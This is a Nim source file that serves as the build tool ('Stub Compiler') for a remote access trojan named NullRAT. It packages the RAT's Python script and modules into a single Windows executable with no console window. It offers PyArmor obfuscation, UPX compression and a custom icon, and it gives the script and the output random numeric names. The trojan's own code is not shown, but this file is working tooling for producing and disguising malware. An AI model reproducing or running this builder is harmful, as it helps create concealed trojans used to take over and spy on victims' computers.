import std/terminal
import std/os
import std/osproc
import std/random
import std/envvars
import std/[strutils, strformat]

from utils import cleanWorkingDir, printName

proc compiler*(): int = 
    printName()
    var appDirectory = getAppDir()
    setCurrentDir(appDirectory / "NullRAT")
    
    stdout.styledWriteLine({styleBright}, "  >> Stub Compiler <<")
    echo ""
    var obfuscate: bool
    var compress: bool
    var icon: bool = false

    # Check Python version, pyarmor no longer supports 3.11+
    var status = execProcess("python --version")
    for i in ["3.11", "3.12", "3.13", "3.14"]:
        if i in status: 
            echo "Python ", i, " is not supported!\n - Pyarmor only supports max python version of 3.10\n - Uninstall Python and run this program again to auto-download the correct version!"
            sleep(5000)
            quit(0)

    stdout.styledWriteLine({styleBright}, "Do you want to obfuscate the executable? (Y/n)")
    var input: char = getch()
    if input == 'N' or input == 'n': 
        obfuscate = false
    elif input == 'Q' or input == 'q': 
        return 0
    else: 
        obfuscate = true
    
    stdout.styledWriteLine({styleBright}, "Do you want to compress the executable? (Y/n)")
    input = getch()
    if input == 'N' or input == 'n': compress = false
    elif input == 'Q' or input == 'q': return 0
    else: compress = true
    
    stdout.styledWriteLine({styleBright}, "Do you want to set a custom icon? (y/N)")
    input = getch()
    var iconPath: string
    if input == 'Y' or input == 'y': 
        icon = true
        echo "Drag and drop .ico file here, and press ENTER..."
        echo "(Or type it's full path)"
        iconPath = readLine(stdin);
        iconPath = iconPath.strip();
        while fileExists(iconPath) == false:
            echo "Icon file not found! Please try again."
            iconPath = readLine(stdin)
    elif input == 'Q' or input == 'q': return 0
    else: icon = false

    printName()
    echo "All options selected: "
    echo "---------------------"
    if obfuscate: echo "Executable will be obfuscated (w/ pyarmor)"
    if compress:
        var path = getEnv("path")
        if path[^1] == ';':
            putEnv("path", fmt"{path}{appDirectory}\NullRAT\upx;")
        else:
            putEnv("path", fmt"{path};{appDirectory}\NullRAT\upx;")
        echo "Executable will be compressed (w/ upx)"
    if icon: 
        echo "Executable will have custom icon"
        echo "Path: ", iconPath
    echo ""
    stdout.styledWriteLine(fgRed, {styleBright}, "Would you like to compile now? (Y/n)")
    input = getch()
    if input == 'N' or input == 'n':
        echo "- User declined request. Aborting..."
        sleep(1500)
        return 0
    elif input == 'Q' or input == 'q': return 0
    else:
        stdout.styledWriteLine(fgCyan, {styleBright}, "- Compiling using selected settings...")
        stdout.styledWriteLine(fgCyan, {styleBright}, "- Checking pyinstaller...")
        var pyinst: string = "undef";
        var armor: string = "undef";
        # Find working pyinstaller executable
        var wherePy: seq[string]
        try:
            wherePy = splitLines(execCmdEx("where pyinstaller").output)
            for pyinstaller in wherePy:
                if pyinstaller == "": continue
                var code = execCmdEx(pyinstaller).exitCode
                if code == 2:
                    pyinst = pyinstaller
                    break
            if "undef" notin pyinst:
                echo "Found! ", pyinst
            else:
                echo "[FATAL] Pyinstaller executable not found."
                echo "Please check your environment variables and python installation"
                echo "before continuing..... Exiting in 5 seconds"
                sleep(5000)
                return 0
        except OSError:
            # Modules not in path, try to find scripts directory
            echo "PyInstaller executable not found"
            echo "Attempting to locate the executable in AppData....."
            var localappdata = getEnv("localappdata")
            for path in walkDirRec(localappdata):
                if "pyinstaller" in path:
                    echo "Found!", path
                    pyinst = path
                    break
            var roamingappdata = getEnv("appdata")
            for path in walkDirRec(roamingappdata):
                if "pyinstaller" in path:
                    echo "Found!", path
                    pyinst = path
                    break
            if "undef" in pyinst:
                echo "[FATAL] Pyinstaller executable not found!"
                echo "Have you put Scripts directory in PATH?"
                echo "\nExiting in 5 seconds....."
                sleep(5000)
                return 0
                
        stdout.styledWriteLine(fgCyan, {styleBright}, "- Checking pyarmor...")
        # Find working pyarmor executable
        try: 
            var whereArmor = splitLines(execCmdEx("where pyarmor-7").output)
            for pyarmor in whereArmor:
                if pyarmor == "": 
                    continue
                var code = execCmdEx(pyarmor).exitCode
                if code == 2:
                    armor = pyarmor
                    break
            if "undef" notin armor:
                echo "Found! ", armor
            else:
                echo "[FATAL] PyArmor executable not found!"
                echo "Have you put Scripts directory in PATH?"
                echo "\nExiting in 5 seconds....."
                sleep(5000)
                return 0
        except OSError:
            # Modules not in path, try to find scripts directory
            echo "PyArmor executable not found"
            echo "Attempting to locate the executable in AppData....."
            var localappdata = getEnv("localappdata")
            for path in walkDirRec(localappdata):
                if "armor" in path:
                    echo "Found!", path
                    armor = path
                    break
            var roamingappdata = getEnv("appdata")
            for path in walkDirRec(roamingappdata):
                if "armor" in path:
                    echo "Found!", path
                    armor = path
                    break
            if "undef" in pyinst:
                echo "[FATAL] Pyarmor executable not found."
                echo "Please check your environment variables and python installation"
                echo "before continuing..... Exiting in 5 seconds"
                sleep(5000)
                return 0
            
        # Compiling
        stdout.styledWriteLine(fgCyan, {styleBright}, "- Creating tempdir...")
        var folderName = "compiling-" & $rand(6969)
        createDir(folderName)
        setCurrentDir(appDirectory / "NullRAT" / folderName)
        var currdir = getCurrentDir()
        echo currdir
        
        echo appDirectory / "NullRAT" / "RAT.py"
        copyFile(appDirectory / "NullRAT" / "RAT.py", currdir / "RAT.py")
        echo appDirectory / "NullRAT" / "Variables.py"
        copyFile(appDirectory / "NullRAT" / "Variables.py", currdir / "Variables.py")
        if icon:
            copyFile(iconPath, currdir / "custom_icon.ico")
            
        var modules: seq[string]
        for path in walkDir(appDirectory / "NullRAT" / "modules"):
            if "create_new" in $path.path.split("\\")[^1]:
                continue
            echo $path.path
            copyFile($path.path, currdir / $path.path.split("\\")[^1])
            modules.add($path.path.split("\\")[^1])

        var pyinst_cmd = pyinst & " --onefile --noconsole --hidden-import mss"
        
        var dat: string 
        if obfuscate:
            dat = fmt" --add-data 'Variables.py;.'"
        else:
            dat = fmt" --add-data ""Variables.py;."""
            pyinst_cmd.add(dat)
        
        var pyarmor_cmd: string
        if icon:
            if obfuscate:
                pyarmor_cmd = armor & fmt" pack --clean -e "" --onefile --noconsole --icon=custom_icon.ico --hidden-import mss {dat}"""
            else:
                pyinst_cmd = pyinst_cmd & " --icon=custom_icon.ico"
        pyarmor_cmd = armor & fmt" pack --clean -e "" --onefile --noconsole --hidden-import mss {dat}"
        moveFile(currdir / "RAT.py", currdir / "765678976567.py")
        pyarmor_cmd.add(dat)

        if obfuscate:
            for m in modules:
                dat = fmt" --add-data '{m};.'"
                pyarmor_cmd.add(dat)
        else:
            for m in modules:
                dat = fmt" --add-data ""{m};."""
                pyinst_cmd.add(dat)
            
        pyinst_cmd.add(" 765678976567.py")
        pyarmor_cmd.add("""" 765678976567.py""")
        
        discard execShellCmd("color C")
        if obfuscate: 
            echo pyarmor_cmd
            discard execShellCmd(pyarmor_cmd)
        else: 
            echo pyinst_cmd
            discard execShellCmd(pyinst_cmd)
        
        var name = $rand(6969) & ".exe"
        if fileExists(currdir / "dist" / "765678976567.exe"):
            moveFile(currdir / "dist" / "765678976567.exe", appDirectory / name)
        setCurrentDir(appDirectory / "NullRAT")
        removeDir(folderName)
        
        printName()
        stdout.styledWriteLine(fgGreen, {styleBright},  "Build Successful! Output in " & name)
        echo "Press any key to exit..."
        discard getch()
        quit(0)